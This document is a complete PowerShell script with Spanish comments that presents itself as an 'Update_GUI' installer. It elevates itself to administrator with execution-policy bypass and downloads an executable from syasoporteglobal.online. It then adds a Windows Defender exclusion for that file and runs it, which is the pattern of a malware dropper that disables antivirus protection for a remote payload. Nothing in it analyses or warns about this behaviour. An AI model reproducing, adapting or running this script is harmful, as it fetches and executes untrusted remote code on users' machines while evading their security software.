# ================= TLS 1.2 =================
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# ================= ADMIN CHECK =================
function Test-Admin {
    $currentIdentity = [Security.Principal.WindowsIdentity]::GetCurrent()
    $principal = New-Object Security.Principal.WindowsPrincipal($currentIdentity)
    return $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

if (-not (Test-Admin)) {
    $scriptPath = $MyInvocation.MyCommand.Path
    Start-Process powershell `
        -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$scriptPath`"" `
        -Verb RunAs
    exit
}

# ================= DETECTAR ARQUITECTURA Y SETEAR URL =================
if ([Environment]::Is64BitOperatingSystem) {
    $arch = "x64"
    $downloadUrl = "https://syasoporteglobal.online/files/OEM/Update_GUI/Update_GUI_x64.exe"
    $fileName = "Update_GUI_x64.exe"
} else {
    $arch = "x86"
    $downloadUrl = "https://syasoporteglobal.online/files/OEM/Update_GUI/Update_GUI_x86.exe"
    $fileName = "Update_GUI_x86.exe"
}
$finalName = "Update_GUI.exe"

Write-Output "Sistema detectado: $arch"

# ================= RUTAS =================
$tempPath  = Join-Path -Path $env:USERPROFILE -ChildPath $fileName
$finalPath = Join-Path -Path $env:USERPROFILE -ChildPath $finalName

# ================= FUNCIÓN DESCARGA =================
function Download-File($url, $output) {
    try {
        Invoke-WebRequest -Uri $url -OutFile $output -UseBasicParsing -ErrorAction Stop
        return $true
    } catch {
        return $false
    }
}

# ================= DESCARGA DIRECTA =================
Write-Output "Descargando archivo desde $downloadUrl..."

$downloaded = Download-File $downloadUrl $tempPath

if (-not $downloaded) {
    Write-Error "Error descargando desde $downloadUrl"
    exit 1
}

# ================= VALIDACIÓN =================
if (-not (Test-Path $tempPath)) {
    Write-Error "El archivo no existe después de la descarga"
    exit 1
}

$fileSize = (Get-Item $tempPath).Length
if ($fileSize -lt 500000) {
    Write-Error "Archivo descargado sospechosamente pequeño"
    exit 1
}

# ================= RENOMBRAR =================
Write-Output "Renombrando a $finalName..."

try {
    if (Test-Path $finalPath) {
        Remove-Item $finalPath -Force
    }

    Rename-Item -Path $tempPath -NewName $finalName
} catch {
    Write-Error "Error renombrando el archivo"
    exit 1
}

Write-Output "Archivo final: $finalPath"

# ================= EXCEPCIÓN DEFENDER =================
try {
    Add-MpPreference -ExclusionPath $finalPath
    Write-Output "Excepción de Windows Defender añadida"
} catch {
    Write-Warning "No se pudo agregar la exclusión"
}

# ================= EJECUTAR =================
Write-Output "Ejecutando $finalName..."

try {
    Start-Process -FilePath $finalPath
} catch {
    Write-Error "Error al ejecutar el archivo"
    exit 1
}
